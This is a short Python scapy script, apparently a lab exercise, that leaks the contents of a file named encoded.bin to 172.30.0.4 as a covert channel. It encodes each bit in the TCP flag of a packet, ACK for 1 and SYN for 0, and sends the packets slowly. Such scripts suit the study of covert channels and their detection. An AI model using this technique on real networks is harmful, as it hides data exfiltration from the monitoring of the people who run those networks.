from scapy.all import *
import time

DEST_IP = "172.30.0.4"
DEST_PORT = 12345

with open("encoded.bin", "rb") as f:
    data = f.read()

# Gửi mỗi byte dưới dạng bit qua TCP
for byte in data:
    for i in range(8):
        bit = (byte >> (7 - i)) & 1  # Lấy bit
        flags = "A" if bit else "S"  # Nếu bit=1 thì set ACK flag
        pkt = IP(dst=DEST_IP)/TCP(dport=DEST_PORT, flags=flags)
        send(pkt, verbose=0)
        time.sleep(0.1)  # Chậm một chút giữa các gói

print(f"[+] Sent {len(data)*8} bits.")

